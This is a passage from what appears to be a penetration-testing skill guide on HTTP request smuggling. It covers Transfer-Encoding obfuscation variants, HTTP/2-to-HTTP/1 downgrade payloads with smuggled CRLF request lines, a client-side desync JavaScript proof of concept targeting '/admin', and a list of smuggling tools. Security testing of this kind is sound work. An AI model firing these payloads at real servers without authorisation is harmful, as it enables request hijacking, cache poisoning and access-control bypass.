## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

## 12. RELATED ROUTING

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.
